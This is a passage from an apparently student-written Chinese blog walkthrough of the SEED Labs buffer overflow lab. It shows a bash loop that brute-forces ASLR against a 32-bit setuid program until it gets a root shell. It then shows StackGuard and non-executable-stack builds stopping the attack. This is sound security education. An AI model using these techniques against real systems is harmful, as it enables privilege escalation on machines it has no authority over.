+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> /sbin/sysctl -w kernel.randomize_va_space=2</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们使用暴力的方法反复攻击漏洞程序，直到我们放在 badfile文件中的地址正确为止。我们 只对32-bit 程序 stack-L1尝试攻击。你可以使用以下的 shell脚本在无限循环中运行漏洞程序。如果 攻击成功，脚本将停止；否则会继续运行。请耐心等待，可能需要几分钟的时间，如果不幸的话则可能需 要等待更长的时间。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>SECONDS=0<br>value=0<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>  value=$(( <span class="hljs-variable">$value</span> + <span class="hljs-number">1</span> ))<br>  duration=<span class="hljs-variable">$SECONDS</span><br>  min=$((<span class="hljs-variable">$duration</span> / <span class="hljs-number">60</span>))<br>  sec=$((<span class="hljs-variable">$duration</span> % <span class="hljs-number">60</span>))<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$min</span> minutes and <span class="hljs-variable">$sec</span> seconds elapsed.&quot;</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The program has been running <span class="hljs-variable">$value</span> times so far.&quot;</span><br>  ./stack-L1<br><span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152786.png" srcset="/img/loading.gif" lazyload alt="image-20251006234759323"></p>
+<p>成功进入root shell。</p>
+<p>对64-bit 程序的暴力攻击要困难得多，因为栈的可用熵要大得多。虽然不要求完成对64-bit程序的暴 力攻击，但是你感兴趣的话可以尝试一下。让它运行一整夜，说不定你很幸运呢。</p>
+<h2 id="Task9：测试其他保护机制"><a href="#Task9：测试其他保护机制" class="headerlink" title="Task9：测试其他保护机制"></a>Task9：测试其他保护机制</h2><h3 id="打开-StackGuard-保护机制"><a href="#打开-StackGuard-保护机制" class="headerlink" title="打开 StackGuard 保护机制"></a>打开 StackGuard 保护机制</h3><p>许多编译器，比如 gcc，实现了一种名为StackGuard的安全机制以防止缓冲区溢出。在这个安全机制 下，缓冲区溢出攻击将不会成功。在之前的任务中，我们在编译程序时禁用了StackGuard保护机制。在 本任务中，我们将打开该保护机制并观察会发生什么。</p>
+<p>首先，在StackGuard安全机制关闭的情况下重复 Level-1攻击，确保攻击仍然可以成功。记得关闭 地址随机化，因为在上个任务中打开了它。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> /sbin/sysctl -w kernel.randomize_va_space=0</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们通过在没有-fno-stack-protector选项的情况下重 新编译漏洞程序 stack.c来打开StackGuard保护机制。在 gcc 4.3.3版本及更高版本中，默认启用了 StackGuard。实施攻击；</p>
+<p>编译时不使用<code>-fno-stack-protector</code>参数，重新编译<code>stack-L1</code></p>
+<p>将以下的部分加入<code>Makefile</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152793.png" srcset="/img/loading.gif" lazyload alt="image-20251006233639955"></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">stackguard:</span><br>	gcc -DBUF_SIZE=<span class="hljs-variable">$(L1)</span> -z execstack <span class="hljs-variable">$(FLAGS_32)</span> -o stack-L1 stack.c<br>	gcc -DBUF_SIZE=<span class="hljs-variable">$(L1)</span> -z execstack <span class="hljs-variable">$(FLAGS_32)</span> -g -o stack-L1-dbg stack.c<br>	sudo chown root stack-L1 &amp;&amp; sudo chmod 4755 stack-L1<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>make stackguard</code>进行编译：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152748.png" srcset="/img/loading.gif" lazyload alt="image-20251006232958007"></p>
+<p>可以发现检测到了栈溢出，终止了程序。</p>
+<h3 id="打开不可执行栈保护机制"><a href="#打开不可执行栈保护机制" class="headerlink" title="打开不可执行栈保护机制"></a>打开不可执行栈保护机制</h3><p>在过去，操作系统允许可执行栈，但现在已经改变了：在Ubuntu操作系统中，程序（和共享库）的 二进制映像必须声明它们是否需要可执行栈，即它们需要在程序头中标记一个字段。内核或动态链接器 使用此标记来决定运行中的程序的栈是否可执行。此标记由 gcc编译器自动设置，默认情况下栈不可执 行。我们也可以在编译程序时使用-z noexecstack选项使栈不可执行。在之前的任务中，我们使用-z execstack 选项使栈可执行。</p>
+<p>在本任务中，我们将使栈不可执行。我们在 shellcode文件夹中完成该实验。call_shellcode程序 将 shellcode的副本放在栈上，然后在栈上执行代码。请在不使用-z execstack选项的情况下重新编译 call_shellcode.c，分别编译为 a32.out和 a64.out。</p>
+<p>攻破不可执行栈保护机制 需要注意的是，不可执行栈只能使栈上无法运行 shellcode，但是它不 能防止缓冲区溢出攻击，因为在利用缓冲区溢出漏洞之后还有其他方法可以运行恶意代码。比如： return-to-libc攻击。我们已经为该攻击设计了一个单独的实验。如果你感兴趣，可以查看Return-to-Libc Attack Lab 的详细介绍。</p>
+<p>编译时使用<code>-z noexecstack</code>参数，使栈上不可执行shellcode</p>
+<p>将以下写入makefile：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152065.png" srcset="/img/loading.gif" lazyload alt="image-20251006233228066"></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">noexecstack:</span><br>	gcc -m32 -z noexecstack -o a32.out call_shellcode.c<br>	gcc -z noexecstack -o a64.out call_shellcode.c<br>	sudo chown root a32.out a64.out<br>	sudo chmod 4755 a32.out a64.out<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152418.png" srcset="/img/loading.gif" lazyload alt="image-20251006233344331"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class="category-chain-item">软件安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SEEDlabs/" class="print-no-link">#SEEDlabs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>软件安全实验 SEEDlabs 缓冲区溢出漏洞实验</div>
+      <div>http://example.com/2026/test36/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test39/" title="软件安全实验 SEEDlabs 竞争条件漏洞实验">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">软件安全实验 SEEDlabs 竞争条件漏洞实验</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test37/" title="软件安全实验 SEEDlabs SQL 注入攻击实验">
+                        <span class="hidden-mobile">软件安全实验 SEEDlabs SQL 注入攻击实验</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
